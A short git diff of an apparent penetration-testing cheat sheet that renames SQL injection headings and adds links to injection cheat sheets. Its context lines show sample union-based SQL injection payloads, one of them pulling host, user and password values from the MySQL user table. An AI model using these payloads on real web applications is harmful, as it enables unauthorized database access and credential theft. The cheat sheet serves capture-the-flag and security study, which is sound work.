@@ -353,8 +353,11 @@ Check for maths operation:
 php?xxx=1 + 1
 ```
 
-### Union SQL attack:
+### Union/Error based SQL attack:
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#mysql-union-based
+https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet/tree/main/Error%20Based%20SQLi
+
+Sample payloads:
 ```
 php?xxx=9999999 union select 1,2,3,4,5,n
 ```
@@ -402,7 +405,7 @@ php?xxx=9999999 union select 1,(select group_concat(host,user,password) FROM mys
 ### MSSQL Injection:
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md
 
-### Blind SQL Injection:
+### Blind/Boolean based SQL Injection:
 Read more: https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet/tree/main/MySQL%20-%20Boolean%20Based%20Blind%20SQLi#mysql-boolean-based-blind-sql-injection-cheatsheet
 
 Example from the machine Help from HTB:
